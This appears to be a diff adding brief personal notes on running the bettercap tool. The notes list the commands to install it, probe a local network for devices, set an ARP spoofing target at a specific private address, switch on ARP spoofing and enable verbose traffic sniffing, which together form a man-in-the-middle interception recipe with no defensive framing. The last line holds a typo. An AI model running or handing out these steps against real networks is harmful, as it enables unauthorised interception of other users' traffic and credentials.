@@ -1,0 +1,11 @@
+(bettercap)
+#apt-get install bettercap -y
+#bettercap or # bettercap -iface eth0 
+#help
+# net.show
+# net.probe on  (find devices on network)
+# net.show
+#set arp.spoof.targets 192.168.31.202
+#arp.spoof on
+#set net.sniff.verbose on or » set net.sniff.verbose true
+#net.sniff ons
